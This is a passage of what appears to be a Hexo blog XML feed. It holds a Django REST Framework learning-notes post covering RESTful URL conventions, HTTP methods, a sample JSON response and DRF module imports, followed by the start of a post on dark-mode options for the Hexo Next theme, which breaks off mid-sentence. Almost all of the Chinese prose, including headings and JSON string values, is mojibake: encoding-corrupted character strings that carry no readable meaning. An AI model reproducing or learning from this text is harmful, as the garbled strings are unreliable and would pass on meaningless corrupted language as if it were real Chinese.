        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (1): Hello RESTful API</strong></em></li><li>Author: dog2</li></ul><hr /><blockquote class="blockquote-center"><i class="fa fa-quote-left"></i><p>ÂâçÂêéÁ´ØÂàÜÁ¶ªÊòØÂ§ßÂäøÊâÄË∂ã</p><i class="fa fa-quote-right"></i></blockquote><h1 id="Êåâ">Êåâ</h1><p>ÊúÄËøëÂú®Â≠¶‰π†Django Rest FrameworkÔºå<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy90dXRvcmlhbC9xdWlja3N0YXJ0Lw==">ÂÆòÊñπÊïôÁ®ã<i class="fa fa-external-link-alt"></i></span>ËæÉÁü≠ÔºåÁúãÂÆåÊÑüËßâÂπ∂Ê≤°ÊúâÂ≠¶‰π†Âà∞ÊúÄ‰Ω≥ÂÆûË∑µÔºåÂØπDRFÁöÑ‰∫ÜËß£ËøòÊòØ‰∏çÊàê‰ΩìÁ≥ª„ÄÇ<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">ÂÆòÊñπAPIÊñáÊ°£<i class="fa fa-external-link-alt"></i></span>ËôΩÁÑ∂ËØ¶ÁªÜ‰∏Ä‰∫õÔºå‰ΩÜÂÜÖÂÆπÂ§ö‰∏îÈõ∂Êï£Êõ¥ÈÄÇÂêàÊü•ÈòÖÔºåÂØπ‰∫éÁ≥ªÁªüÊÄßÂ≠¶‰π†Êù•ËØ¥ËøòÊòØÂ∑Æ‰∫Ü‰∏ÄÁÇπ„ÄÇ</p><p>‰∫éÊòØÊâæÂà∞‰∫Ü<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5FNDExSjdoeA==">‰∏ÄÂ•ó‰∏çÈîôÁöÑDRFÊ∫êÁ†ÅÂàÜÊûêËßÜÈ¢ë<i class="fa fa-external-link-alt"></i></span>Êù•Â≠¶‰π†ÔºåÂπ∂‰∏îÂú®ËøôÈáåËÆ∞‰∏ãÂ≠¶‰π†Á¨îËÆ∞„ÄÇ</p><p>ÂèÇËÄÉ‰∫ÜËøô‰∏§‰ΩçÂêåÂ≠¶ÁöÑÁ¨îËÆ∞ÔºåÂ§ßÈÉ®ÂàÜÊòØËßÜÈ¢ëËÆ≤Â∏àÂú®ËßÜÈ¢ëÈáåÂÅöËøáÁöÑËØæÂ†ÇÁ¨îËÆ∞„ÄÇ</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ2N1aWNhbi9jYXRlZ29yeS8xNjA3ODIyLmh0bWw=">ÈöèÁ¨îÂàÜÁ±ª - Django REST frameworkÁ¨îËÆ∞<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWFuZ2ppYW9zaG91L2NhdGVnb3J5LzE2NzUwMjEuaHRtbA==">ÈöèÁ¨îÂàÜÁ±ª - Django--drfÁõ∏ÂÖ≥<i class="fa fa-external-link-alt"></i></span></li></ul><p>Ê†πÊçÆÊàë‰∏™‰∫∫ÁêÜËß£ÂØπÁ¨îËÆ∞ÂÅö‰∫ÜÈÉ®ÂàÜ‰øÆÊîπ„ÄÅÊï¥ÁêÜÂíåË°•ÂÖÖ„ÄÇËøôÈáåÊúâÊàëÁöÑ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZg==">ÊµãËØï‰ª£Á†Å<i class="fa fa-external-link-alt"></i></span>ÂèØ‰æõÂèÇËÄÉÔºåÂåÖÊã¨djangoÈ°πÁõÆ„ÄÅdbÊï∞ÊçÆÂíåpostmanÁöÑÊµãËØïÊï∞ÊçÆÂåÖ„ÄÇ</p><h1 id="Âü∫Êú¨Ê¶ÇÂøµ">Âü∫Êú¨Ê¶ÇÂøµ</h1><ul><li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUExJUE4JUU3JThFJUIwJUU1JUIxJTgyJUU3JThBJUI2JUU2JTgwJTgxJUU4JUJEJUFDJUU2JThEJUEy">RESTful<i class="fa fa-external-link-alt"></i></span></strong>: Representational State Transfer Ë°®Áé∞Â±ÇÁä∂ÊÄÅËΩ¨Êç¢</li><li><strong>ful</strong>: ÂΩ¢ÂÆπËØçÂêéÁºÄÔºåË°®Á§∫‚ÄúÔºàËøô‰∏ÄÔºâÁ±ªÁöÑ„ÄÅÔºàËøôÁßçÔºâÈ£éÊ†ºÁöÑ‚Äù</li><li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNiU4RSVBNSVFNSU4RiVBMw==">API<i class="fa fa-external-link-alt"></i></span></strong>: Application Programming Interface Â∫îÁî®Á®ãÂ∫èÊé•Âè£</li><li><strong>Êé•Âè£</strong>ÔºöËÅîÁ≥ª‰∏§‰∏™Áâ©Ë¥®ÁöÑÂ™í‰ªãÔºåÂÆåÊàê‰ø°ÊÅØ‰∫§‰∫í</li><li><strong>WebÁ®ãÂ∫èÊé•Âè£</strong><ul><li>ÂäüËÉΩÔºöËÅîÁ≥ªÂâçÂè∞È°µÈù¢‰∏éÂêéÂè∞Êï∞ÊçÆÂ∫ìÁöÑÂ™í‰ªã</li><li>ÁªÑÊàê<ul><li>url: ÈïøÂæóÂÉèËøîÂõûÊï∞ÊçÆÁöÑurlÈìæÊé•</li><li>ËØ∑Ê±ÇÂèÇÊï∞: ÂâçÂè∞ÊåâÁÖßÊåáÂÆöÁöÑkeyÊèê‰æõÊï∞ÊçÆÁªôÂêéÂè∞</li><li>ÂìçÂ∫îÊï∞ÊçÆ: ÂêéÂè∞‰∏éÊï∞ÊçÆÂ∫ì‰∫§‰∫íÂêéÂ∞ÜÊï∞ÊçÆÂèçÈ¶àÁªôÂâçÂè∞</li></ul></li></ul></li></ul><a id="more"></a><h1 id="restful-api">RESTful API</h1><h2 id="Êé•Âè£ËßÑËåÉ">Êé•Âè£ËßÑËåÉ</h2><ul><li>ÂäüËÉΩÔºö‰∏∫‰∫ÜÈááÁî®‰∏çÂêåÁöÑÂêéÂè∞ËØ≠Ë®ÄÔºå‰πüËÉΩ‰ΩøÁî®ÂêåÊ†∑ÁöÑÊé•Âè£ÔºåËé∑ÂèñÂà∞ÂêåÊ†∑ÁöÑÊï∞ÊçÆ</li><li>Êé•Âè£Ôºö<ul><li>url</li><li>Áõ∏Â∫îÊï∞ÊçÆ</li></ul></li><li>Êé•Âè£ÊñáÊ°£Ôºö<ul><li>url + ËØ∑Ê±ÇÂèÇÊï∞</li><li>ÂìçÂ∫îÊï∞ÊçÆ</li></ul></li></ul><h2 id="urlËßÑËåÉ">URLËßÑËåÉ</h2><p>RESFful APIÁöÑURLÂ∫îÂåÖÂê´Â¶Ç‰∏ãÈÉ®ÂàÜÔºö</p><h3 id="Áî®apiÂÖ≥ÈîÆÂ≠óÊ†áËØÜÊé•Âè£url">Áî®apiÂÖ≥ÈîÆÂ≠óÊ†áËØÜÊé•Âè£url</h3><p>Â¶Ç - api.baidu.com - www.baidu.com/api</p><h3 id="‰ºòÂÖàÈÄâÊã©httpsÂçèËÆÆ">‰ºòÂÖàÈÄâÊã©httpsÂçèËÆÆ</h3><p>Êé•Âè£Êï∞ÊçÆÂÆâÂÖ®ÊÄßËÄÉÈáè</p><h3 id="ÁâàÊú¨Ê†áËØÜ">ÁâàÊú¨Ê†áËØÜ</h3><p>Â¶Ç</p><ul><li>api.baidu.com/v1/...</li><li>api.baidu.com/v2/...</li></ul><h3 id="ËµÑÊ∫ê">ËµÑÊ∫ê</h3><p>Êé•Âè£Êìç‰ΩúÁöÑÊï∞ÊçÆÂØπË±°ÔºåÂú®url‰∏≠‰∏ÄËà¨ÈááÁî®ËµÑÊ∫êÔºàÂêçËØçÔºâÂ§çÊï∞ÂΩ¢Âºè„ÄÇ‰∏Ä‰∏™Êé•Âè£ÂèØ‰ª•ÂåÖÂê´ÂØπËØ•ËµÑÊ∫êÁöÑÂ§öÁßçÊìç‰ΩúÊñπÂºè„ÄÇÂ¶Ç</p><ul><li>api.baidu.com/books</li><li>api.baidu.com/books/(pk)</li></ul><h3 id="ËØ∑Ê±ÇÊñπÊ≥ï">ËØ∑Ê±ÇÊñπÊ≥ï</h3><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRUUC9NZXRob2Rz">HTTPËØ∑Ê±ÇÊñπÊ≥ï<i class="fa fa-external-link-alt"></i></span>ÔºåÊ†áËØÜÊìç‰ΩúËµÑÊ∫êÁöÑÊñπÂºèÔºåÂ¶Ç</p><ul><li><code>GET /books/</code> &amp; <code>GET /books/(pk)</code>: Ëé∑ÂèñÊâÄÊúâ/Ëé∑Âèñ‰∏Ä‰∏™</li><li><code>POST /books/</code>: Â¢ûÂä†‰∏Ä‰∏™(Â§ö‰∏™)</li><li><code>DELETE /books/(pk)</code>: Âà†Èô§‰∏Ä‰∏™</li><li><code>PUT /books/(pk)</code>: Êï¥‰ΩìÊõ¥Êñ∞‰∏Ä‰∏™</li><li><code>PATCH /books/(pk)</code>: Â±ÄÈÉ®Êõ¥Êñ∞‰∏Ä‰∏™</li></ul><h3 id="ËØ∑Ê±ÇÂèÇÊï∞">ËØ∑Ê±ÇÂèÇÊï∞</h3><p>ÂæÄÂæÄÊ∂âÂèäÊï∞ÊçÆÁöÑÂêÑÁßçËøáÊª§Êìç‰ΩúÂèäË°®Áé∞ÂΩ¢Âºè - Á≠õÈÄâ„ÄÅÊéíÂ∫è„ÄÅÈôêÂà∂ÔºåÂ¶Ç</p><ul><li>api.baidu.com/books/?search=Ë•ø&amp;ordering=-price&amp;limit=3</li></ul><h2 id="ÂìçÂ∫îÊï∞ÊçÆ">ÂìçÂ∫îÊï∞ÊçÆ</h2><p>APIËøîÂõûÁöÑÊï∞ÊçÆÔºå‰∏ÄËà¨‰∏∫JsonÊ†ºÂºèÔºåÂ¶Ç</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"errcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"Query success."</span>,</span><br><span class="line">    <span class="attr">"body"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"location"</span>: <span class="string">"116.298457,39.848625"</span>,</span><br><span class="line">            <span class="attr">"radius"</span>: <span class="number">41</span>,</span><br><span class="line">            <span class="attr">"country"</span>: <span class="string">"‰∏≠ÂõΩ"</span>,</span><br><span class="line">            <span class="attr">"province"</span>: <span class="string">"Âåó‰∫¨Â∏Ç"</span>,</span><br><span class="line">            <span class="attr">"city"</span>: <span class="string">"Âåó‰∫¨Â∏Ç"</span>,</span><br><span class="line">            <span class="attr">"citycode"</span>: <span class="string">"131"</span>,</span><br><span class="line">            <span class="attr">"district"</span>: <span class="string">"‰∏∞Âè∞Âå∫"</span>,</span><br><span class="line">            <span class="attr">"road"</span>: <span class="string">"‰∏∞Âè∞ÂçóË∑Ø44Âè∑"</span>,</span><br><span class="line">            <span class="attr">"ctime"</span>: <span class="string">"1551178833"</span>,</span><br><span class="line">            <span class="attr">"indoor"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="attr">"error"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol type="1"><li>ÂìçÂ∫îÁä∂ÊÄÅÁ†ÅÔºöÁî±ÂºÄÂèëËÄÖÔºàÂâçÁ´Ø„ÄÅÂêéÁ´Ø„ÄÅÂÆ¢Êà∑ÔºâÂÆö‰πâÔºåÊòØÂØπËµÑÊ∫êËØ∑Ê±ÇÁªìÊûúÁöÑÂ∫îÁî®Â±ÇÁä∂ÊÄÅÁ†ÅÔºåÈùûHTTPÂìçÂ∫îÁä∂ÊÄÅÁ†Å„ÄÇ<ul><li>Â∏∏ËßÅÂ≠óÊÆµÂêçÁ§∫‰æãÔºö<ul><li><code>&quot;status&quot;</code></li><li><code>&quot;errcode&quot;</code></li></ul></li><li>Â∏∏ËßÅÂÄºÁ§∫‰æãÔºö<ul><li><code>0</code>: Ë°®Á§∫Êìç‰ΩúËµÑÊ∫êÊàêÂäü</li><li><code>1</code>: Ë°®Á§∫Êìç‰ΩúËµÑÊ∫êÂ§±Ë¥•</li><li><code>2</code>: Ë°®Á§∫Êìç‰ΩúËµÑÊ∫êÊàêÂäüÔºå‰ΩÜÊ≤°ÂåπÈÖçÁªìÊûú</li></ul></li></ul></li><li>ÂìçÂ∫îÁä∂ÊÄÅÁ†ÅÊñáÂ≠óËØ¥Êòé<ul><li>Â∏∏ËßÅÂ≠óÊÆµÂêçÁ§∫‰æã<ul><li><code>&quot;msg&quot;</code></li><li><code>&quot;message&quot;</code></li></ul></li></ul></li><li>ËµÑÊ∫êÊú¨Ë∫´<ul><li>Â∏∏ËßÅÂ≠óÊÆµÂêçÁ§∫‰æã<ul><li><code>&quot;data&quot;</code></li><li><code>&quot;results&quot;</code></li></ul></li></ul></li></ol><p>Ê≥®ÊÑèÔºö‰∏çËÉΩÁõ¥Êé•ËøîÂõûÁöÑËµÑÊ∫ê(Â≠êËµÑÊ∫ê„ÄÅÂõæÁâá„ÄÅËßÜÈ¢ëÁ≠âËµÑÊ∫ê)ÔºåËÄåÊòØËøîÂõûËØ•ËµÑÊ∫êÁöÑurlÈìæÊé•</p><h1 id="Âü∫‰∫érestfulËßÑËåÉÁöÑÂéüÁîüdjangoÊé•Âè£">Âü∫‰∫érestfulËßÑËåÉÁöÑÂéüÁîüDjangoÊé•Âè£</h1><p>ÊµãËØï‰ª£Á†ÅÂèäÊï∞ÊçÆËØ∑ÂèÇËßÅ <a href="https://github.com/dog-2/hello_drf/tree/master/no1_my_restapi" target="_blank" rel="noopener">demoÈ°πÁõÆ <code>no1_my_restapi</code></a></p><div class="note warning"><p>ÂéüÁîüÊé•Âè£ÂØπ<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdqdW41MTU5L2FydGljbGUvZGV0YWlscy80Nzc4MTQ0Mw==">ÂêÑÁßçÊ†ºÂºèÁöÑPOSTÊï∞ÊçÆ<i class="fa fa-external-link-alt"></i></span>ÁöÑÊîØÊåÅÊÉÖÂÜµÂ¶Ç‰∏ãÔºö</p><ul><li>[x] form-data</li><li>[x] x-www-form-urlencoded</li><li>[ ] <del>rawÔºöÂåÖÊã¨ Â∏∏ËßÅÁöÑjson„ÄÅxmlÁ≠â</del></li></ul><p>‰πüÂ∞±ÊòØËØ¥ <strong>ÂéüÁîüÊé•Âè£Âπ∂‰∏çÊîØÊåÅÂØπPOSTËØ∑Ê±Ç‰∏≠jsonÊï∞ÊçÆÁöÑËá™Âä®Ëß£ÊûêÔºåÂêéÁ´ØÂè™ËÉΩÊãøÂà∞Êï¥‰∏™jsonÂ≠óÁ¨¶‰∏≤</strong></p></div><h1 id="drf---django-rest-framework">DRF - Django REST Framework</h1><p>DRFÊúâÂ¶Ç‰∏ã‰∏ªË¶ÅÊ®°ÂùóÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView, ...                      <span class="comment"># ËßÜÂõæÊ®°Âùó - ÂØπdjangoÂéüÁîüËßÜÂõæÁ±ªÁöÑÂ∞ÅË£Ö</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response, ...                  <span class="comment"># ÂìçÂ∫îÊ®°Âùó - ÂØπdjangoÂéüÁîüÂìçÂ∫îÁ±ªÁöÑÂ∞ÅË£Ö</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.request <span class="keyword">import</span> Request, ...                    <span class="comment"># ËØ∑Ê±ÇÊ®°Âùó - ÂØπdjangoÂéüÁîüËØ∑Ê±ÇÁ±ªÁöÑÂ∞ÅË£Ö</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer, ...             <span class="comment"># Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÊ®°Âùó</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.settings <span class="keyword">import</span> APISettings                    <span class="comment"># DRFÁöÑÈÖçÁΩÆÊñá‰ª∂</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter, ...               <span class="comment"># RESTful API Âü∫Á°ÄÂäüËÉΩ - ËøáÊª§</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination, ...    <span class="comment"># RESTful API Âü∫Á°ÄÂäüËÉΩ - ÂàÜÈ°µ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> TokenAuthentication, ... <span class="comment"># RESTful API Âü∫Á°ÄÂäüËÉΩ - ËÆ§ËØÅ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated, ...        <span class="comment"># RESTful API Âü∫Á°ÄÂäüËÉΩ - ÊùÉÈôêÔºàÊòØÂê¶ÁôªÂΩïÔºâ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle           <span class="comment"># RESTful API Âü∫Á°ÄÂäüËÉΩ - È¢ëÁéá</span></span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ DRF Âú® djangoÂéüÊúâÂü∫Á°Ä‰∏äËøõË°åÁ±ªÂ∞ÅË£ÖÔºåÂπ∂ÂÆûÁé∞Á±ª RESTful APIÁöÑÂêÑÂ§ßÂü∫Á°ÄÂäüËÉΩ„ÄÇ</p><p>ÂéüÁîüView‰∏çÂêåÔºåDRFÂÆûÁé∞‰∫ÜÂØπjsonÊ†ºÂºèÁöÑPOSTËØ∑Ê±ÇÊï∞ÊçÆÁöÑËá™Âä®Ëß£ÊûêÔºö</p><ul><li>[x] form-data</li><li>[x] x-www-form-urlencoded</li><li>[x] rawÔºöÂåÖÊã¨ Â∏∏ËßÅÁöÑjson„ÄÅxmlÁ≠â</li></ul><h1 id="Êâ©Â±ïÈòÖËØª">Êâ©Â±ïÈòÖËØª</h1><ul><li><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzdGFwaXR1dG9yaWFsLmNvbS8=">A RESTful Tutorial<i class="fa fa-external-link-alt"></i></span></strong></li><li><strong>API Design Cheat Sheet</strong>: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldC9ibG9iL21hc3Rlci9SRUFETUUtemgtSGFucy5tZA==">‰∏≠Êñá<i class="fa fa-external-link-alt"></i></span> / <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldCNhcGktZGVzaWduLWNoZWF0LXNoZWV0">EN<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2RyZi5qaXV5b3UuaW5mby8jLw==">DRF API ÊåáÂçó<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9xMW1pLmdpdGh1Yi5pby9EamFuZ28tUkVTVC1mcmFtZXdvcmstZG9jdW1lbnRhdGlvbi8=">DRF ÂÆòÊñπÊñáÊ°£ÔºàÂéÜÂè≤ÁâàÊú¨Ôºâ‰∏≠ÊñáÁøªËØë<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyaWZhbi9odHRwX3Jlc3RmdWxfYXBp">HTTPÂêéÂè∞Á´ØÔºöRESTful APIÊé•Âè£ËÆæËÆ°<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HexoÔºàNext‰∏ªÈ¢òÔºâÂÆûÁé∞ÂèØÂàáÊç¢ÁöÑDark Mode(ÊöóËâ≤ËÉåÊôØ/Â§úÈó¥Ê®°Âºè)</title>
      <link href="/tech/hexo-dark-mode-note/"/>
      <url>/tech/hexo-dark-mode-note/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Hexo Dark Mode Note</strong></em></li><li>Author: dog2</li></ul><hr /><blockquote><p>Dark Mode ‚Äî‚Äî ‰∏≠ËÄÅÂπ¥Á®ãÂ∫èüê∂ÁöÑÁúºÁùõÁª≠ÂëΩÂøÖÂ§áÂäüËÉΩ</p></blockquote><p>Mac„ÄÅWin Á∫∑Á∫∑Êé®Âá∫‰∫Ü Dark ModeÔºåÂÆâÂçì‰πüÂéüÁîüÊîØÊåÅ‰∫ÜÈöèÁùÄÂ§úÂπïÈôç‰∏¥Ëá™Âä®Ë∞ÉÊï¥Â±èÂπï‰∫ÆÂ∫¶ÔºàËìùÂÖâÔºâÁöÑÂäüËÉΩÔºåÁúãÊù•‰øùÊä§ÁúºÁùõ„ÄÅÂÖ≥Áà±Á®ãÂ∫èÁåøÊòØÂ§ßÂäøÊâÄË∂ã„ÄÇ</p><p>ËøôÈáåÔºåÊàë‰ª¨Â∞ùËØï‰∫Ü3Áßç‰ΩøHexo Next‰∏ªÈ¢òÂàáÊç¢‰∏∫darkmodeÁöÑÊñπÂºè„ÄÇ</p><a id="more"></a><h1 id="ÊñπÊ°à1ÂÆòÊñπÊúÄÊñ∞Áâànext">ÊñπÊ°à1ÔºöÂÆòÊñπÊúÄÊñ∞ÁâàNext</h1><p>NextÂú®ÊúÄËøëÁöÑÂá†‰∏™ÁâàÊú¨ÁöÑÊõ¥Êñ∞‰∏≠<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">Âä†ÂÖ•‰∫ÜÂØπdarkmodeÁöÑÂéüÁîüÊîØÊåÅ<i class="fa fa-external-link-alt"></i></span>ÔºåÈÖçÁΩÆÈùûÂ∏∏ÁÆÄÂçï„ÄÇ</p><ul><li>ÈÖçÁΩÆÊñπÊ≥ïÔºöÂèÇËßÅ <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9pbmRleC5odG1sI0RhcmstTW9kZQ==">ÂÆòÊñπÊñáÊ°£<i class="fa fa-external-link-alt"></i></span>Âíå<span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1sI0Rhcmttb2Rl">Â§ß‰Ω¨‰ª¨ÁöÑÊñáÁ´†<i class="fa fa-external-link-alt"></i></span></li><li>‰ºòÁÇπÔºöÈÖçÁΩÆÈùûÂ∏∏ÁÆÄÂçï</li><li>Áº∫ÁÇπÔºö<ul><li>Ê†πÊçÆËá™Â∑±ÁöÑÊµãËØïÔºåSafariÂíåFirefox Ê≤°ÊúâÈóÆÈ¢òÔºå‰ΩÜÊòØChromeÊó†Êïà</li><li>‰∏çËÉΩËøõË°åÂàáÊç¢ÔºåËÄåÊòØÊ†πÊçÆÁ≥ªÁªüÂÅèÂ•ΩÔºàÊòØÂê¶ÊòØÂ§úÈó¥Ê®°ÂºèÔºâÊù•Âà§Êñ≠ ÊòØÂê¶ÂêØÁî®</li></ul></li></ul><h1 id="ÊñπÊ°à2hexo-next-nightmodeÊèí‰ª∂">ÊñπÊ°à2Ôºöhexo-next-nightmodeÊèí‰ª∂</h1><ul><li>ÈÖçÁΩÆÊñπÊ≥ïÔºöËØ∑ÂèÇËßÅ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2Rl">ÂÆòÊñπËØ¥Êòé<i class="fa fa-external-link-alt"></i></span></li><li>‰ºòÁÇπÔºöÂèØ‰ª•ÂàáÊç¢ÔºåÈÖçÁΩÆÁõ∏ÂØπÁÆÄÂçï</li><li>Áº∫ÁÇπÔºö<ul><li>ÈúÄË¶ÅÈ¢ùÂ§ñÂÆâË£ÖÊèí‰ª∂</li><li>ÂºÄÂêØÂêé‰ºöÂú®‰æßËæπÊ†èÁöÑ‰∏™‰∫∫‰ø°ÊÅØ‰∏ÄËßà(Overview)ÈáåÊ∑ªÂä†ÂàáÊç¢ÈªëÁôΩËÉåÊôØÁöÑÊåâÈíÆÔºå‰ΩÜÊòØ <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF2OS9oZXhvLW5leHQtbmlnaHRtb2RlL2lzc3Vlcy8xMA==">ÂΩìÂâçÁâàÊú¨Ê≤°ÊúâÈªòËÆ§‰ΩøÁî®ÊöóËâ≤ËÉåÊôØÁöÑÈÄâÈ°π<i class="fa fa-external-link-alt"></i></span></li><li>ÈªòËÆ§ÂàáÊç¢ÊåâÈíÆÂú®OverviewÈáåÔºåÂèØËÉΩ‰ºöÊúâÂ¶Ç‰∏ãÂºäÁ´Ø<ul><li>Â¶ÇÊûúËÆæÁΩÆ‰∏∫ÈªòËÆ§ÈöêËóè‰æßËæπÊ†èÔºåÂàôÁî®Êà∑È¶ñÊ¨°ËÆøÈóÆÈ¶ñÈ°µÊó∂Ôºå‰∏çÁü•ÈÅìÊúâÂ§úÈó¥Ê®°Âºè</li><li>Âú®ÊñáÁ´†È°µÈù¢Êó∂Ôºå‰æßËæπÊ†èÊòØÊúâ‰∏§‰∏™Ê†áÁ≠æÁªÑÊàêÔºåÈªòËÆ§ÊòæÁ§∫ÊñáÁ´†Â§ßÁ∫≤„ÄÇÂõ†Ê≠§Âè™ÊúâÂàáÊç¢Ëá≥OverviewÂêéÊâçËÉΩÂêéÁÇπÂáªËÉåÊôØÂàáÊç¢ÊåâÈíÆ</li></ul></li><li>bugÔºödarkmode‰∏ãÔºåheader‰ΩçÁΩÆË¢´ÈÄâ‰∏≠ÁöÑcategoryËÉåÊôØËâ≤ÂèòÊàê‰∫ÜËìùËâ≤</li></ul></li></ul><h1 id="ÊñπÊ°à3ÂºïÂÖ•jsÂ∫ì-darkmode.js">ÊñπÊ°à3ÔºöÂºïÂÖ•jsÂ∫ì <code>darkmode.js</code></h1><h2 id="ÁºòÁî±ÈùûÈáçÁÇπÂèØÁï•Ëøá">ÁºòÁî±ÔºàÈùûÈáçÁÇπÂèØÁï•ËøáÔºâ</h2><p>‰ªé<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">NextÂä†ÂÖ•‰∫ÜÂØπdarkmodeÁöÑÂéüÁîüÊîØÊåÅÁöÑPRÈ°µÈù¢ÁöÑËÆ®ËÆ∫<i class="fa fa-external-link-alt"></i></span>ÂèØ‰ª•ÁúãÂà∞ÔºåÂú®ÊüêÂ§ß‰Ω¨XÂêëNextÂÆòÊñπË¥°ÁåÆ‰∫ÜÂéüÁîüdarkmodeÁöÑ‰ª£Á†ÅÂêéÔºåÊüêÁΩëÂèãÂêëÂÖ∂ÂëºÂêÅÂä†‰∏ÄÊ≠•Âä†‰∏äÂàáÊç¢ÊåâÈíÆ„ÄÇ</p><p>‰ΩÜÂ§ß‰Ω¨X‰ºº‰πé‰∏çÊâìÁÆóÂä†ÔºåÂπ∂Ë°®Á§∫ËØ•ÁΩëÂèãÂèØ‰ª•‰ΩøÁî®jsÂ∫ì <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.js<i class="fa fa-external-link-alt"></i></span> ÂéªÂÆûÁé∞„ÄÇ</p><p>Ê≤°ÊÉ≥Âà∞ÁΩëÂèãÂÖ∂ÂÆûÊòØÂ§ß‰Ω¨YÔºåÊûúÁÑ∂Âú®<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">Ëá™Â∑±ÁöÑÂçöÂÆ¢<i class="fa 